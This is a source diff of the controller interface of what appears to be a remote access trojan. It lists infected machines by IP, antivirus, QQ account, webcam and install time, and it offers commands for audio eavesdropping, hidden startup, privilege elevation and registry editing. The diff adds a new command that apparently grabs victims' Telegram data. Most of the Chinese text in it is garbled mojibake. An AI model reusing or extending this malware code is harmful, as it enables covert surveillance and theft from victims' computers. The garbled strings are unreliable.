@@ -1,4 +1,4 @@
-ï»¿// ClientView.cpp : implementation of the CClientView class
+// ClientView.cpp : implementation of the CClientView class
 //
 
 #include "stdafx.h"
@@ -29,8 +29,8 @@
 #include "LogView.h"
 #include "DllDlg.h"	
 #include "ProxyMapDlg.h"
-#include <mmsystem.h>  //å¯¼å…¥å£°éŸ³å¤´æ–‡ä»¶
-#pragma comment(lib,"winmm.lib") //å¯¼å…¥å£°éŸ³å¤´æ–‡ä»¶åº“
+#include <mmsystem.h>  //µ¼ÈëÉùÒôÍ·ÎÄ¼þ
+#pragma comment(lib,"winmm.lib") //µ¼ÈëÉùÒôÍ·ÎÄ¼þ¿â
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -53,25 +53,25 @@ typedef struct
 
 LISTHEAD g_Column_Data[] = 
 {
-	{_T("å›½å®¶/åŒºåŸŸ"),			150	},//0
-	{_T("ç½‘ç»œ"),		        65	},//1
-	{_T("é£žæœº/æ€æ¯’"),	        150 },//2
-	{_T("å¤–ç½‘IP"),			    160	},//3
-	{_T("å†…ç½‘IP"),			    160	},//4
-	{_T("åœ¨çº¿QQ"),		        100	},//5
-	{_T("æ“ä½œç³»ç»Ÿ"),			150	},//6
-	{_T("ç”¨æˆ·çŠ¶æ€"),		    120	},//7
-	{_T("å¤„ç†å™¨"),              95	},//8
-	{_T("ç½‘ç»œå»¶è¿Ÿ"),		    0	},//9
-	{_T("è®¡ç®—æœºå/å¤‡æ³¨"),      	150	},//10ç¡¬ç›˜/å†…å­˜
-	{_T("ç¡¬ç›˜/å†…å­˜"),	        150	},//11è®¡ç®—æœºå/å¤‡æ³¨
-	{_T("ç½‘å¡"),		        0   },//12
-	{_T("è§†é¢‘"),			    0	},//13
-	{_T("ç­›é€‰"),			    0	},//14
-	{_T("ç‰ˆæœ¬"),			    80	},//15
-	{_T("å®‰è£…æ—¶é—´(åŒ—äº¬æ—¶é—´)"),	140	},//16
-	{_T("è¿è¡Œæ—¶é—´"),	    	120	},//17
-	{_T("è¿žæŽ¥æ–¹å¼"),		    0   },//18
+	{_T("¹ú¼Ò/ÇøÓò"),			150	},//0
+	{_T("ÍøÂç"),		        65	},//1
+	{_T("·É»ú/É±¶¾"),	        150 },//2
+	{_T("ÍâÍøIP"),			    160	},//3
+	{_T("ÄÚÍøIP"),			    160	},//4
+	{_T("ÔÚÏßQQ"),		        100	},//5
+	{_T("²Ù×÷ÏµÍ³"),			150	},//6
+	{_T("ÓÃ»§×´Ì¬"),		    120	},//7
+	{_T("´¦ÀíÆ÷"),              95	},//8
+	{_T("ÍøÂçÑÓ³Ù"),		    0	},//9
+	{_T("¼ÆËã»úÃû/±¸×¢"),      	150	},//10Ó²ÅÌ/ÄÚ´æ
+	{_T("Ó²ÅÌ/ÄÚ´æ"),	        150	},//11¼ÆËã»úÃû/±¸×¢
+	{_T("Íø¿¨"),		        0   },//12
+	{_T("ÊÓÆµ"),			    0	},//13
+	{_T("É¸Ñ¡"),			    0	},//14
+	{_T("°æ±¾"),			    80	},//15
+	{_T("°²×°Ê±¼ä(±±¾©Ê±¼ä)"),	140	},//16
+	{_T("ÔËÐÐÊ±¼ä"),	    	120	},//17
+	{_T("Á¬½Ó·½Ê½"),		    0   },//18
 };
 
 int g_Column_DaWid[30]={0};
@@ -112,6 +112,7 @@ ON_COMMAND(IDM_CLEAN_Application, OnCleanApplication)
 /////////////////////////////////////////
 ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
 ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
+ON_COMMAND(IDM_GET_TELEGRAM, OnGetTelegram)
 ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
 ON_COMMAND(IDM_SHOWMSG, OnShowMsg)
 ON_COMMAND(IDM_CHANGEGROUP, OnChangeGroup)
@@ -119,29 +120,29 @@ ON_COMMAND(IDM_SYSINFO, OnSysinfo)
 ON_COMMAND(IDM_REGEDIT, OnRegedit)
 ON_COMMAND(IDM_SERMANAGER, OnSerManager)
 ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
-//å¤åˆ¶ä¿¡æ¯
+//¸´ÖÆÐÅÏ¢
 ON_COMMAND(IDM_IPLIST, OnIPList)
 ON_COMMAND(IDM_IP, OnIP)
 ON_COMMAND(IDM_BEIZHU, OnBeiZhu)
 ON_COMMAND(IDM_DILIXINXI, OnDiLiXinXi)
 ON_COMMAND(IDM_ALL, OnAll)
-//ç­›é€‰åŠŸèƒ½
+//É¸Ñ¡¹¦ÄÜ
 ON_COMMAND(IDM_FIND_PROCESS, OnSortProcess)
 ON_COMMAND(IDM_FINDWINDOWS, OnSortWindow)
 ON_COMMAND(ID_CHONGZHI, OnChongZhi)
-//è¿œç¨‹äº¤è°ˆ
+//Ô¶³Ì½»Ì¸
 ON_COMMAND(IDM_CHAT, OnChat)
 ON_COMMAND(IDM_QQINFO, OnQQInfo)
 ON_COMMAND(IDM_MAP, OnMap)
-ON_COMMAND(IDM_START_HIDE, OnStartHide) //éšè—è¿è¡Œ
-ON_COMMAND(IDM_START_SHOW, OnStartShow) //æ­£å¸¸è¿è¡Œ
-//å†™å…¥å¯åŠ¨
+ON_COMMAND(IDM_START_HIDE, OnStartHide) //Òþ²ØÔËÐÐ
+ON_COMMAND(IDM_START_SHOW, OnStartShow) //Õý³£ÔËÐÐ
+//Ð´ÈëÆô¶¯
 ON_COMMAND(IDM_START, OnStart)
-//WIN10åŠå±
+//WIN10°ëÆÁ
 ON_COMMAND(ID_Screen, OnScreen)
 ON_COMMAND(ID_MENUITEM_PROXY_MAP, OnMenuitemProxyMap)
-ON_COMMAND(IDM_Elevate_Privileges, OnElevate_Privileges)//WIN7æå‡æƒé™
-ON_COMMAND(ID_EXP_ReStart, OnReStartexp)//é‡å¯Exp
+ON_COMMAND(IDM_Elevate_Privileges, OnElevate_Privileges)//WIN7ÌáÉýÈ¨ÏÞ
+ON_COMMAND(ID_EXP_ReStart, OnReStartexp)//ÖØÆôExp
 ON_COMMAND(ID_IEQC, OnIEQC)
 //}}AFX_MSG_MAP
 ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
@@ -208,8 +209,8 @@ void CClientView::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult)
 // 		{
 // 			if (m_pListCtrl->GetNextSelectedItem(pos) == nItem)
 // 			{
-// 				clrText   =  RGB(255, 255, 255); //ç™½è‰²
-// 				crlTextBk =  RGB(51, 153, 255);  //è“è‰²
+// 				clrText   =  RGB(255, 255, 255); //°×É«
+// 				crlTextBk =  RGB(51, 153, 255);  //À¶É«
 // 				pLVCD->clrText = clrText;
 // 				pLVCD->clrTextBk = crlTextBk;
 // 			}
@@ -218,29 +219,29 @@ void CClientView::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult)
 		int nItem = static_cast<int> (pLVCD->nmcd.dwItemSpec); 	
 		bool bDBImplFail = false;
 		COLORREF   m_clrText; 
-		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 0)//è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦è®¾ç½®
+		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 0)//ÕâÀïÊÇÅÐ¶ÏÊÇ·ñÉèÖÃ
 		{ 
-			m_clrText  =  RGB(255,97,0) ; // æ©™è‰²
+			m_clrText  =  RGB(255,97,0) ; // ³ÈÉ«
 		}
 		
-		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 1)//è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦è®¾ç½®
+		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 1)//ÕâÀïÊÇÅÐ¶ÏÊÇ·ñÉèÖÃ
 		{ 
-			m_clrText  =  RGB(0, 0, 0) ; // é»‘è‰²
+			m_clrText  =  RGB(0, 0, 0) ; // ºÚÉ«
 		}
 		
-		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 2)//è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦è®¾ç½®
+		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 2)//ÕâÀïÊÇÅÐ¶ÏÊÇ·ñÉèÖÃ
 		{ 
-			m_clrText  =  RGB(255, 0, 0) ; // çº¢è‰²
+			m_clrText  =  RGB(255, 0, 0) ; // ºìÉ«
 		}
 		
-		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 3)//è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦è®¾ç½®
+		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 3)//ÕâÀïÊÇÅÐ¶ÏÊÇ·ñÉèÖÃ
 		{ 
-			m_clrText  =  RGB(0,0,255) ; // è“è‰²
+			m_clrText  =  RGB(0,0,255) ; // À¶É«
 		}
 		
-		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 4)//è¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦è®¾ç½®
+		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 4)//ÕâÀïÊÇÅÐ¶ÏÊÇ·ñÉèÖÃ
 		{ 
-			m_clrText  =  RGB(160,32,240) ; // ç´«è‰²
+			m_clrText  =  RGB(160,32,240) ; // ×ÏÉ«
 		}
 		
 		pLVCD->clrText = m_clrText; 	
@@ -316,7 +317,7 @@ void CClientView::OnInitialUpdate()
 	{
 		m_pListCtrl = &GetListCtrl();
 		I_ImageList.Create(20, 16, ILC_COLOR32,10, 0);
-		HICON hIcon = NULL;//ä»¥ä¸‹ä¸ºåŠ å…¥3ä¸ªå›¾æ ‡èµ„æº
+		HICON hIcon = NULL;//ÒÔÏÂÎª¼ÓÈë3¸öÍ¼±ê×ÊÔ´
 		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 16, 16, 0);
 		I_ImageList.Add(hIcon);
 		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME), IMAGE_ICON, 16, 16, 0);
@@ -327,7 +328,7 @@ void CClientView::OnInitialUpdate()
 	{
 		m_pListCtrl = &GetListCtrl();
 		I_ImageList.Create(20, 16, ILC_COLOR32|ILC_MASK,10, 0);
-		HICON hIcon = NULL;	// ä»¥ä¸‹ä¸ºåŠ å…¥å›¾æ ‡èµ„æº		
+		HICON hIcon = NULL;	// ÒÔÏÂÎª¼ÓÈëÍ¼±ê×ÊÔ´		
 		int Icot = sizeof(msgInfo)/sizeof(MSGINFO);
 		for(int t=0; t<Icot; t++)
 		{ 
@@ -336,23 +337,23 @@ void CClientView::OnInitialUpdate()
 			I_ImageList.Add(hIcon);
 			DestroyIcon(hIcon); 
 		}
-		ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);  //å°†å¾—åˆ°çš„æ“ä½œç³»ç»Ÿçš„å›¾åƒåˆ—è¡¨æŽ§ä»¶åˆ†é…
+		ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);  //½«µÃµ½µÄ²Ù×÷ÏµÍ³µÄÍ¼ÏñÁÐ±í¿Ø¼þ·ÖÅä
 	}
 	
-	//ç½‘æ ¼çº¿
+	//Íø¸ñÏß
 	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "gridlines", false) == 0)
 	{
-// 		m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM | */LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //æ— å¤é€‰æ¡†
-// 			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES);     //æœ‰ç½‘æ ¼çº¿
-		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |           //æœ‰å¤é€‰æ¡†
-			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES/*| LVS_EX_GRIDLINES*/); //æ— ç½‘æ ¼çº¿
+// 		m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM | */LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //ÎÞ¸´Ñ¡¿ò
+// 			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES);     //ÓÐÍø¸ñÏß
+		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |           //ÓÐ¸´Ñ¡¿ò
+			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES/*| LVS_EX_GRIDLINES*/); //ÎÞÍø¸ñÏß
 	}
 	else
 	{
-// 		m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM | */LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |   //æ— å¤é€‰æ¡†
-// 			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //æœ‰ç½‘æ ¼çº¿
-		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //æœ‰å¤é€‰æ¡†
-			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //æœ‰ç½‘æ ¼çº¿
+// 		m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM | */LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |   //ÎÞ¸´Ñ¡¿ò
+// 			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //ÓÐÍø¸ñÏß
+		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //ÓÐ¸´Ñ¡¿ò
+			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //ÓÐÍø¸ñÏß
 	}
 	
 	operate = ((CClientApp *)AfxGetApp())->m_IniFile.GetDWORD("Settings", "operate", 3);
@@ -361,14 +362,14 @@ void CClientView::OnInitialUpdate()
 		operate = 3;
 	}
 	
-	// æ”¹å˜åœ¨çº¿ä¸»æœºå­—ä½“é¢œè‰²
-//	m_pListCtrl->SetTextColor(RGB(240,0,150));  //ç²‰çº¢æ˜¾ç¤º
-//	m_pListCtrl->SetTextColor(RGB(0,100,255));  //è“è‰²æ˜¾ç¤º
-//	m_pListCtrl->SetTextColor(RGB(160,32,240)); //ç´«è‰²æ˜¾ç¤º
-//	m_pListCtrl->SetTextColor(RGB(0,255,0));    //ç»¿è‰²æ˜¾ç¤º
-//	m_pListCtrl->SetTextColor(RGB(255,0,255));  //æ·±ç²‰çº¢æ˜¾ç¤º
-//	m_pListCtrl->SetTextColor(RGB(255,0,0));    //çº¢è‰²æ˜¾ç¤º
-//	m_pListCtrl->SetBkColor(RGB(0,0,0));        //è®¾ç½®èƒŒæ™¯
+	// ¸Ä±äÔÚÏßÖ÷»ú×ÖÌåÑÕÉ«
+//	m_pListCtrl->SetTextColor(RGB(240,0,150));  //·ÛºìÏÔÊ¾
+//	m_pListCtrl->SetTextColor(RGB(0,100,255));  //À¶É«ÏÔÊ¾
+//	m_pListCtrl->SetTextColor(RGB(160,32,240)); //×ÏÉ«ÏÔÊ¾
+//	m_pListCtrl->SetTextColor(RGB(0,255,0));    //ÂÌÉ«ÏÔÊ¾
+//	m_pListCtrl->SetTextColor(RGB(255,0,255));  //Éî·ÛºìÏÔÊ¾
+//	m_pListCtrl->SetTextColor(RGB(255,0,0));    //ºìÉ«ÏÔÊ¾
+//	m_pListCtrl->SetBkColor(RGB(0,0,0));        //ÉèÖÃ±³¾°
 	m_pListCtrl->SetTextBkColor(-1); 
 	ChildNotifyWidth();
 	
@@ -382,7 +383,7 @@ void CClientView::OnInitialUpdate()
 	{
 		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
 		m_pListCtrl->SetColumnWidth(i, g_Column_DaWid[i]);
-		g_Column_Width += g_Column_DaWid[i]; // æ€»å®½åº¦
+		g_Column_Width += g_Column_DaWid[i]; // ×Ü¿í¶È
 	}
 	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
 	m_header.SubclassWindow(hWndHeader);
@@ -415,7 +416,7 @@ void CClientView::ChildNotifyWidth()
 	for (int i = 0; i < g_Column_Count; i++)
 	{
 		if(i==g_Column_Count)
-			g_Column_DaWid[i] = 0;  //æœ€åŽæ˜¯åˆ†ç»„ å§‹ç»ˆä¿æŒä¸ºé›¶
+			g_Column_DaWid[i] = 0;  //×îºóÊÇ·Ö×é Ê¼ÖÕ±£³ÖÎªÁã
 		else
 		{
 			if(DaWids[i])
@@ -465,7 +466,7 @@ void CClientView::OnSize(UINT nType, int cx, int cy)
 			double dcx=(double)cx/g_Column_Width; 
 			for(i=0;i<g_Column_Count;i++)
 			{
-				double dd=g_Column_DaWid[i];          //å¾—åˆ°å½“å‰åˆ—çš„å®½åº¦
+				double dd=g_Column_DaWid[i];          //µÃµ½µ±Ç°ÁÐµÄ¿í¶È
 				dd = dd*dcx;
 				str_cx[i] = (int)dd;
 			}
@@ -473,7 +474,7 @@ void CClientView::OnSize(UINT nType, int cx, int cy)
 			m_pListCtrl->LockWindowUpdate();
 			for(i=0;i<g_Column_Count;i++)
 			{
-				m_pListCtrl->SetColumnWidth(i,str_cx[i]);       //è®¾ç½®å½“å‰çš„å®½åº¦
+				m_pListCtrl->SetColumnWidth(i,str_cx[i]);       //ÉèÖÃµ±Ç°µÄ¿í¶È
 			}
 			m_pListCtrl->UnlockWindowUpdate(); 
 		}
@@ -556,7 +557,7 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 	{
 		int nCnt = m_pListCtrl->GetItemCount();
 		
-		// ä¸åˆæ³•çš„æ•°æ®åŒ…
+		// ²»ºÏ·¨µÄÊý¾Ý°ü
 		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
 			return -1;
 		
@@ -566,7 +567,7 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		CString	str, WanIPAddress, LanIPAddress;		
 		int i = 0;
 		
-		// å¤–ç½‘IP
+		// ÍâÍøIP
 		sockaddr_in  sockAddr;
 		memset(&sockAddr, 0, sizeof(sockAddr));
 		int nSockAddrLen = sizeof(sockAddr);
@@ -576,36 +577,36 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		else
 			WanIPAddress = inet_ntoa(LoginInfo->WanIPAddress);
 		
-		// å›½æ——
+		// ¹úÆì
 		str = ((CClientApp *)AfxGetApp())->m_SeuQQwry.IPtoAddr(WanIPAddress);
 		int countryno=FindCountry(str);
-		i = m_pListCtrl->InsertItem(nCnt, str, countryno);//ä½¿ç”¨æŒ‡å®šå›¾è¡¨
+		i = m_pListCtrl->InsertItem(nCnt, str, countryno);//Ê¹ÓÃÖ¸¶¨Í¼±í
 		m_pListCtrl->SetItemText(i, 0, str);
 		
-		// ç½‘ç»œç±»åž‹
+		// ÍøÂçÀàÐÍ
 		LanIPAddress = inet_ntoa(LoginInfo->LanIPAddress);
 		if (WanIPAddress == LanIPAddress)
-			str = "å†…ç½‘";
+			str = "ÄÚÍø";
 		else
-			str = "å¤–ç½‘";
+			str = "ÍâÍø";
 		m_pListCtrl->SetItemText(i, 1, str);
 
-		// æ€æ¯’è½¯ä»¶
+		// É±¶¾Èí¼þ
 		str.Format(" %s", LoginInfo->Virus);
 		m_pListCtrl->SetItemText(i, 2, str);
 		
-		// å¤–ç½‘IP
+		// ÍâÍøIP
 		m_pListCtrl->SetItemText(i, 3, WanIPAddress);
 		
-		// å†…ç½‘IP
+		// ÄÚÍøIP
 		m_pListCtrl->SetItemText(i, 4, LanIPAddress);
 
-		// åœ¨çº¿QQ
+		// ÔÚÏßQQ
 		str.Format(_T("%s"), LoginInfo->szQQNum );
 		m_pListCtrl->SetItemText(i, 5, str);
 		
 		////////////////////////////////////////////////////////////////////////////////////////
-		// æ“ä½œç³»ç»Ÿ
+		// ²Ù×÷ÏµÍ³
 		char *pszOS = NULL;
 		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
 		{
@@ -698,7 +699,7 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		}	
 		
 		CString OSNumber;
-		if (LoginInfo->bIs64) // å¹³å°
+		if (LoginInfo->bIs64) // Æ½Ì¨
 			OSNumber = _T("64");
 		else
 			OSNumber = _T("32");
@@ -712,25 +713,25 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 			);
 		m_pListCtrl->SetItemText(i, 6, strOS);
 
-		//ç”¨æˆ·çŠ¶æ€
+		//ÓÃ»§×´Ì¬
 		if (LoginInfo->bIsActive)
-			m_pListCtrl->SetItemText(i, 7, _T(" ç¦»çº¿ "));
+			m_pListCtrl->SetItemText(i, 7, _T(" ÀëÏß "));
 		else
-			m_pListCtrl->SetItemText(i, 7, _T(" åœ¨çº¿ "));
+			m_pListCtrl->SetItemText(i, 7, _T(" ÔÚÏß "));
 		
 		// CPU
-		str.Format(_T("%dÃ—%dMHz"), LoginInfo->nCPUNumber,LoginInfo->dwCPUClockMhz);
+		str.Format(_T("%d¡Á%dMHz"), LoginInfo->nCPUNumber,LoginInfo->dwCPUClockMhz);
 		m_pListCtrl->SetItemText(i, 8, str);
 
-		// ç½‘å¡
+		// Íø¿¨
 		if (LoginInfo->Speed >= 1000)
 			str.Format("%dGbps", LoginInfo->Speed/1000);
 		else
 			str.Format("%dMbps", LoginInfo->Speed);
 		m_pListCtrl->SetItemText(i, 9, str);
-		// ä¸»æœºå
+		// Ö÷»úÃû
 		m_pListCtrl->SetItemText(i, 10, LoginInfo->HostName);
-		// ç¡¬ç›˜ å†…å­˜
+		// Ó²ÅÌ ÄÚ´æ
 		str.Format(_T("%.0fGB/%.2fGB"), (float)(LoginInfo->DriverSize) / 1024,(float)LoginInfo->MemSize/1024);
 		m_pListCtrl->SetItemText(i, 11, str);
 
@@ -740,47 +741,47 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		str.Format(_T("%d"), LoginInfo->dwSpeed);
 		m_pListCtrl->SetItemText(i, 12, str);
 		
-		// è§†é¢‘
-		str = LoginInfo->bIsWebCam ? _T(" æœ‰") : _T(" -/-");
+		// ÊÓÆµ
+		str = LoginInfo->bIsWebCam ? _T(" ÓÐ") : _T(" -/-");
 		m_pListCtrl->SetItemText(i, 13, str);
 		
-		// ç­›é€‰
+		// É¸Ñ¡
 		m_pListCtrl->SetItemText(i, 14, " -/-");
 		
-		// ç‰ˆæœ¬ä¿¡æ¯
+		// °æ±¾ÐÅÏ¢
 		m_pListCtrl->SetItemText(i, 15, LoginInfo->szVersion);
 		
-		// æœåŠ¡å®‰è£…æ—¶é—´
+		// ·þÎñ°²×°Ê±¼ä
 		str.Format("%s", LoginInfo->MarkTime);
 		m_pListCtrl->SetItemText(i, 16, str);
 		
-		// è¿è¡Œæ—¶é—´
+		// ÔËÐÐÊ±¼ä
 		m_pListCtrl->SetItemText(i, 17, LoginInfo->RunTime);
 
-		// è¿žæŽ¥æ–¹å¼
+		// Á¬½Ó·½Ê½
         if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
         {
-            m_pListCtrl->SetItemText(i, 18, _T("WAN è¿žæŽ¥"));
+            m_pListCtrl->SetItemText(i, 18, _T("WAN Á¬½Ó"));
         }
         else
         {
             m_pListCtrl->SetItemText(i, 18, LoginInfo->sznet);
         }
 		
-		// æ°”æ³¡æç¤º
-		strToolTipsText.Format("ä¸»æœºå: %s\nIPåœ°å€: %s\nåŒºåŸŸ: %s\nç³»ç»Ÿ: %s\nè§†é¢‘: %s\næ€æ¯’: %s",LoginInfo->HostName,WanIPAddress,m_pListCtrl->GetItemText(i,0),strOS,LoginInfo->bIsWebCam?_T("æœ‰"):_T("æ— "),LoginInfo->Virus);
+		// ÆøÅÝÌáÊ¾
+		strToolTipsText.Format("Ö÷»úÃû: %s\nIPµØÖ·: %s\nÇøÓò: %s\nÏµÍ³: %s\nÊÓÆµ: %s\nÉ±¶¾: %s",LoginInfo->HostName,WanIPAddress,m_pListCtrl->GetItemText(i,0),strOS,LoginInfo->bIsWebCam?_T("ÓÐ"):_T("ÎÞ"),LoginInfo->Virus);
 		
-		// æŒ‡å®šå”¯ä¸€æ ‡è¯†
+		// Ö¸¶¨Î¨Ò»±êÊ¶
 		m_pListCtrl->SetItemData(i, (DWORD) pContext);
 		
 		if (!((CClientApp *)AfxGetApp())->m_bIsDisablePopTips)
 			g_pFrame->ShowToolTips(strToolTipsText);
 		
-		strLogText.Format("ä¸»æœºä¸Šçº¿: [%s]   OS: [%s]   Ver: [%s]   åŒºåŸŸ: [%s]",WanIPAddress,strOS,LoginInfo->szVersion,m_pListCtrl->GetItemText(i,0));
+		strLogText.Format("Ö÷»úÉÏÏß: [%s]   OS: [%s]   Ver: [%s]   ÇøÓò: [%s]",WanIPAddress,strOS,LoginInfo->szVersion,m_pListCtrl->GetItemText(i,0));
 	//	g_pLogView->InsertLogItem(strLogText, 2, 0);
-		g_pLogView->InsertLogItem("ä¸»æœºä¸Šçº¿ï¼š",strLogText, 0, 1 );
+		g_pLogView->InsertLogItem("Ö÷»úÉÏÏß£º",strLogText, 0, 1 );
 		
-		//æ’­æ”¾å£°éŸ³/////////////////////////////////////////////////////////////////
+		//²¥·ÅÉùÒô/////////////////////////////////////////////////////////////////
 		BOOL a_chk = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
 		if (a_chk != true)
 		{
@@ -788,14 +789,14 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		}
 		//////////////////////////////////////////////////////////////////////////
 		
-		////////////////////////////////////////é‡å¤ä¸Šçº¿é—®é¢˜////////////////////////////////////////////////
+		////////////////////////////////////////ÖØ¸´ÉÏÏßÎÊÌâ////////////////////////////////////////////////
 		int Tmpi=0;
 		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ )
 		{
 			if( m_pListCtrl->GetItemText( nCnt , 3 ) == m_pListCtrl->GetItemText( Tmpi , 3 ))
-			{ //å…ˆåˆ¤æ–­å¤–ç½‘IP
+			{ //ÏÈÅÐ¶ÏÍâÍøIP
 				if( m_pListCtrl->GetItemText( nCnt , 4 ) == m_pListCtrl->GetItemText( Tmpi , 4 ))
-				{ //å†åˆ¤æ–­å†…ç½‘IP
+				{ //ÔÙÅÐ¶ÏÄÚÍøIP
 					CString strOSCount;
 					strOSCount = m_pListCtrl->GetItemText( i, 6 );
 					if ( strOSCount.Find(_T("NT")) != -1 )
@@ -851,7 +852,7 @@ LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
 	}
 	catch(...){}
 	
-	// æ›´æ–°å½“å‰è¿žæŽ¥æ€»æ•°
+	// ¸üÐÂµ±Ç°Á¬½Ó×ÜÊý
 	g_pFrame->ShowOSCount();
 	g_pFrame->ShowConnectionsNumber();
 	g_pTabView->UpDateNumber();
@@ -862,28 +863,28 @@ int CClientView::FindCountry(CString local)
 {
 	
 	CString country[]={
-		"ä¸­å›½","é˜¿å°”å·´å°¼äºš","é˜¿å°”åŠåˆ©äºš","é˜¿å¯Œæ±—","é˜¿æ ¹å»·","é˜¿æ‹‰ä¼¯å›½å®¶è”ç›Ÿ","é˜¿è”é…‹","é˜¿æ›¼","é˜¿å¡žæ‹œç–†","åŸƒåŠ",
-		"åŸƒå¡žä¿„æ¯”äºš","çˆ±å°”å…°","çˆ±æ²™å°¼äºš","å®‰é“å°”","å®‰å“¥æ‹‰","å®‰æç“œå’Œå·´å¸ƒè¾¾","å¥¥åœ°åˆ©","æ¾³å¤§åˆ©äºš","æ¾³é—¨","å·´å·´å¤šæ–¯",
-		"å·´å¸ƒäºšæ–°å‡ å†…äºš","å·´å“ˆé©¬","å·´åŸºæ–¯å¦","å·´æ‹‰åœ­","å·´å‹’æ–¯å¦","å·´æž—","å·´æ‹¿é©¬","å·´è¥¿","ç™½ä¿„ç½—æ–¯","ä¿åŠ åˆ©äºš",
-		"åŒ—å¤§è¥¿æ´‹å…¬çº¦ç»„ç»‡","è´å®","æ¯”åˆ©æ—¶","å†°å²›","æ³¢å…°","æ³¢æ–¯å°¼äºšå’Œé»‘å¡žå“¥ç»´é‚£","çŽ»åˆ©ç»´äºš","åšèŒ¨ç“¦çº³","ä¸ä¸¹","å¸ƒåŸºçº³æ³•ç´¢",
-		"å¸ƒéš†è¿ª","æœé²œ","èµ¤é“å‡ å†…äºš","ä¸¹éº¦","å¾·å›½","ä¸œå¸æ±¶","ä¸œå—äºšå›½å®¶åä¼š","ç‹¬ç«‹å›½å®¶å›½å","å¤šå“¥","å¤šç±³å°¼åŠ ",
